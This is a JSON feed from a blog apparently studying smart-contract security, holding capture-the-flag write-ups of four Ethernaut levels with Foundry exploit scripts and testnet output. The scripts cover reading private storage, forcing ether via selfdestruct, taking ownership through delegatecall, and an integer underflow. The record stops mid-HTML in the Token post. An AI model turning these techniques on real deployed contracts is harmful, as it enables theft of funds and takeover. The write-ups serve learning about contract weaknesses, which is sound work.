{
    "version": "https://jsonfeed.org/version/1",
    "title": "0o3q",
    "home_page_url": "https://0o3q.github.io/",
    "feed_url": "https://0o3q.github.io/feed.json",
    "description": "studying web3",
    "icon": "https://0o3q.github.io/apple-touch-icon.png",
    "favicon": "https://0o3q.github.io/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "0o3q",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://0o3q.github.io/2025/04/19/vault",
            "title": "Vault",
            "summary": null,
            "content_text": "AnalysisThe goal is  Unlock the vault// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault {    bool public locked;    bytes32 private password;    constructor(bytes32 _password) {        locked = true;        password = _password;    }    function unlock(bytes32 _password) public {        if (password == _password) {            locked = false;        }    }}Because the blockchain is transparent, secret keys cannot be stored on it.Exploit$ cast storage 0x65E998C6f70c90f149553c967BA4a38Ecc6213A9 10x412076657279207374726f6e67207365637265742070617373776f7264203a29// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Vault.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract ValutSol is Script {    Vault public vault_ = Vault(0x65E998C6f70c90f149553c967BA4a38Ecc6213A9);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        vault_.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);        vm.stopBroadcast();    }}$ forge script script/VaultSol.sol --broadcast[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†í] Solc 0.8.29 finished in 322.36msCompiler run successful!Script ran successfully.## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.00101144 gweiEstimated total gas used for script: 36108Estimated amount required: 0.00000003652107552 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x14d0aaca36fb737a61c0a533652da5a4d2314117698a64a1788ec28633d7f1b1Block: 3685538Paid: 0.000000026441866776 ETH (26143 gas * 0.001011432 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000026441866776 ETH (26143 gas * avg 0.001011432 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Unlock the vault</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Vault</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">locked</span><span class=\"p\">;</span>    <span class=\"kt\">bytes32</span> <span class=\"k\">private</span> <span class=\"n\">password</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>        <span class=\"n\">password</span> <span class=\"o\">=</span> <span class=\"n\">_password</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">password</span> <span class=\"o\">==</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Because the blockchain is transparent, secret keys cannot be stored on it.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>cast storage 0x65E998C6f70c90f149553c967BA4a38Ecc6213A9 10x412076657279207374726f6e67207365637265742070617373776f7264203a29</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/cyberchef.png\" alt=\"Image cyberchef\" /></p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Vault.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">ValutSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Vault</span> <span class=\"k\">public</span> <span class=\"n\">vault_</span> <span class=\"o\">=</span> <span class=\"n\">Vault</span><span class=\"p\">(</span><span class=\"mh\">0x65E998C6f70c90f149553c967BA4a38Ecc6213A9</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">vault_</span><span class=\"p\">.</span><span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"mh\">0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/VaultSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†í] Solc 0.8.29 finished <span class=\"k\">in </span>322.36msCompiler run successful!Script ran successfully.<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.00101144 gweiEstimated total gas used <span class=\"k\">for </span>script: 36108Estimated amount required: 0.00000003652107552 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x14d0aaca36fb737a61c0a533652da5a4d2314117698a64a1788ec28633d7f1b1Block: 3685538Paid: 0.000000026441866776 ETH <span class=\"o\">(</span>26143 gas <span class=\"k\">*</span> 0.001011432 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000026441866776 ETH (26143 gas * avg 0.001011432 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/locked.png\" alt=\"Image locked\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/vault",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/force",
            "title": "Force",
            "summary": null,
            "content_text": "AnalysisThe goal is  make the balance of the contract greater than zero// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force { /*                   MEOW ?         /\\_/\\   /    ____/ o o \\    /~____  =√∏= /    (______)__m_m)                   */ }Solidity 0.8.30 Documentation - sending and receiving etherüí°Neither contracts nor ‚Äúexternal accounts‚Äù are currently able to prevent someone from sending them Ether. Contracts can react on and reject a regular transfer, but there are ways to move Ether without creating a message call. One way is to simply ‚Äúmine to‚Äù the contract address and the second way is using¬†`selfdestruct(x)`.Solidity 0.8.30 Documentation - deactivate and self destructThe selfdestruct() function removes code from blockchain.It move Ether stored in the contract to a specified address without creating a message call.Even if a contract‚Äôs code does not contain a call to selfdestruct, it can still perform that operation using delegatecall or callcode.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Force.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(address payable force_) payable {        selfdestruct(force_);    }}contract ForceSol is Script {    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        new Ex{value: 1 wei}(payable(0xD38Cdc747b3Fdc5B553ec592a89b92db3015c2e6));        vm.stopBroadcast();    }}$ forge script script/ForceSol.sol --broadcast --tc ForceSol[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001062799 gweiEstimated total gas used for script: 83584Estimated amount required: 0.000000088832991616 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xfe8f4a467eb59cc75d1969cbcb0338d23b568d91028e387bba6bcebb5c605526Contract Address: 0xfF2baB3F127feb02B77A4dBd869b25f63d442b79Block: 3677667Paid: 0.000000068333210136 ETH (64296 gas * 0.001062791 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000068333210136 ETH (64296 gas * avg 0.001062791 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>make the balance of the contract greater than zero</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Force</span> <span class=\"p\">{</span> <span class=\"cm\">/*                   MEOW ?         /\\_/\\   /    ____/ o o \\    /~____  =√∏= /    (______)__m_m)                   */</span> <span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#sending-and-receiving-ether\">Solidity 0.8.30 Documentation - sending and receiving ether</a></p><aside>üí°Neither contracts nor ‚Äúexternal accounts‚Äù are currently able to prevent someone from sending them Ether. Contracts can react on and reject a regular transfer, but there are ways to move Ether without creating a message call. One way is to simply ‚Äúmine to‚Äù the contract address and the second way is using¬†`selfdestruct(x)`.</aside><p><a href=\"https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct\">Solidity 0.8.30 Documentation - deactivate and self destruct</a></p><p>The <code class=\"language-plaintext highlighter-rouge\">selfdestruct()</code> function removes code from blockchain.</p><p>It move Ether stored in the contract to a specified address without creating a message call.</p><p>Even if a contract‚Äôs code does not contain a call to selfdestruct, it can still perform that operation using delegatecall or callcode.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Force.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">force_</span><span class=\"p\">)</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">selfdestruct</span><span class=\"p\">(</span><span class=\"n\">force_</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ForceSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0xD38Cdc747b3Fdc5B553ec592a89b92db3015c2e6</span><span class=\"p\">));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/ForceSol.sol <span class=\"nt\">--broadcast</span> <span class=\"nt\">--tc</span> ForceSol<span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001062799 gweiEstimated total gas used <span class=\"k\">for </span>script: 83584Estimated amount required: 0.000000088832991616 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xfe8f4a467eb59cc75d1969cbcb0338d23b568d91028e387bba6bcebb5c605526Contract Address: 0xfF2baB3F127feb02B77A4dBd869b25f63d442b79Block: 3677667Paid: 0.000000068333210136 ETH <span class=\"o\">(</span>64296 gas <span class=\"k\">*</span> 0.001062791 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000068333210136 ETH (64296 gas * avg 0.001062791 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Force/getbalance.png\" alt=\"Image getbalance\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-19-Force/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/force",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/delegation",
            "title": "Delegation",
            "summary": null,
            "content_text": "AnalysisThe goal is  claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate {    address public owner;    constructor(address _owner) {        owner = _owner;    }    function pwn() public {        owner = msg.sender;    }}contract Delegation {    address public owner;    Delegate delegate;    constructor(address _delegateAddress) {        delegate = Delegate(_delegateAddress);        owner = msg.sender;    }    fallback() external {        (bool result,) = address(delegate).delegatecall(msg.data);        if (result) {            this;        }    }}The fallback() function in the Delegation contract performs delegatecall() to the Delegate contract.The Delegation contract‚Äôs state can be changed by caliing the pwn() function in Delegate contract via delegatecall().msg.sender in the Delegate contract will be EOA because the call is made by using delegationcall().Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Delegation.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract DelegationSol is Script {    Delegation public delegation_ = Delegation(0x604BD638031054664E87618f46871c5423E9cbFF);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        address(delegation_).call(abi.encodeWithSignature(\"pwn()\"));        console.log(\"owner: \", delegation_.owner());        vm.stopBroadcast();    }}$ forge script script/DelegationSol.sol --broadcast[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†î] Solc 0.8.29 finished in 280.67msCompiler run successful with warnings:Warning (9302): Return value of low-level calls not used.  --&gt; script/DelegationSol.sol:14:9:   |14 |         address(delegation_).call(abi.encodeWithSignature(\"pwn()\"));   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.== Logs ==  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001000019 gweiEstimated total gas used for script: 43100Estimated amount required: 0.0000000431008189 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xd749896a13ac87778efd535f37a37c59d6b88fedeb517b326aa83c0af160e8fdBlock: 3677303Paid: 0.000000031204249632 ETH (31204 gas * 0.001000008 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000031204249632 ETH (31204 gas * avg 0.001000008 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Delegate</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">pwn</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Delegation</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"n\">Delegate</span> <span class=\"n\">delegate</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_delegateAddress</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">delegate</span> <span class=\"o\">=</span> <span class=\"n\">Delegate</span><span class=\"p\">(</span><span class=\"n\">_delegateAddress</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">fallback</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">delegate</span><span class=\"p\">).</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">this</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The <code class=\"language-plaintext highlighter-rouge\">fallback()</code> function in the Delegation contract performs <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code> to the Delegate contract.</p><p>The Delegation contract‚Äôs state can be changed by caliing the <code class=\"language-plaintext highlighter-rouge\">pwn()</code> function in Delegate contract via <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code>.</p><p><code class=\"language-plaintext highlighter-rouge\">msg.sender</code> in the Delegate contract will be EOA because the call is made by using <code class=\"language-plaintext highlighter-rouge\">delegationcall()</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Delegation.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">DelegationSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Delegation</span> <span class=\"k\">public</span> <span class=\"n\">delegation_</span> <span class=\"o\">=</span> <span class=\"n\">Delegation</span><span class=\"p\">(</span><span class=\"mh\">0x604BD638031054664E87618f46871c5423E9cbFF</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">delegation_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"pwn()\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">delegation_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/DelegationSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†î] Solc 0.8.29 finished <span class=\"k\">in </span>280.67msCompiler run successful with warnings:Warning <span class=\"o\">(</span>9302<span class=\"o\">)</span>: Return value of low-level calls not used.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/DelegationSol.sol:14:9:   |14 |         address<span class=\"o\">(</span>delegation_<span class=\"o\">)</span>.call<span class=\"o\">(</span>abi.encodeWithSignature<span class=\"o\">(</span><span class=\"s2\">\"pwn()\"</span><span class=\"o\">))</span><span class=\"p\">;</span>   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001000019 gweiEstimated total gas used <span class=\"k\">for </span>script: 43100Estimated amount required: 0.0000000431008189 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xd749896a13ac87778efd535f37a37c59d6b88fedeb517b326aa83c0af160e8fdBlock: 3677303Paid: 0.000000031204249632 ETH <span class=\"o\">(</span>31204 gas <span class=\"k\">*</span> 0.001000008 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000031204249632 ETH (31204 gas * avg 0.001000008 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Delegation/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/delegation",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/token",
            "title": "Token",
            "summary": null,
            "content_text": "AnalysisThe goal is  hands on any additional tokens.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token {    mapping(address =&gt; uint256) balances;    uint256 public totalSupply;    constructor(uint256 _initialSupply) public {        balances[msg.sender] = totalSupply = _initialSupply;    }    function transfer(address _to, uint256 _value) public returns (bool) {        require(balances[msg.sender] - _value &gt;= 0);        balances[msg.sender] -= _value;        balances[_to] += _value;        return true;    }    function balanceOf(address _owner) public view returns (uint256 balance) {        return balances[_owner];    }}Overflow can occur in Solidity versions under 0.8.0.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"../src/Token.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract TokenSol is Script {    Token public token_ = Token(0xc5176701831Dcf084be5f95617605D2107d97182);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"balance: \", token_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        token_.transfer(address(0), 21);        console.log(\"balance: \", token_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        vm.stopBroadcast();    }}$ forge script script/TokenSol.sol --broadcast[‚†ä] Compiling...[‚†í] Compiling 1 files with Solc 0.6.12[‚†ë] Solc 0.6.12 finished in 497.00msCompiler run successful!Script ran successfully.== Logs ==  balance:  20  balance:  115792089237316195423570985008687907853269984665640564039457584007913129639935## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001000007 gweiEstimated total gas used for script: 67542Estimated amount required: 0.000000067542472794 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x6b9a4361bf15dc0a907240c72dd64d9c5cfbffafd2bbfd0197ad7dd053aa115eBlock: 3677316Paid: 0.0000000489 ETH (48900 gas * 0.001 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.0000000489 ETH (48900 gas * avg 0.001 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>hands on any additional tokens.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Token</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">totalSupply</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_initialSupply</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">totalSupply</span> <span class=\"o\">=</span> <span class=\"n\">_initialSupply</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_value</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span 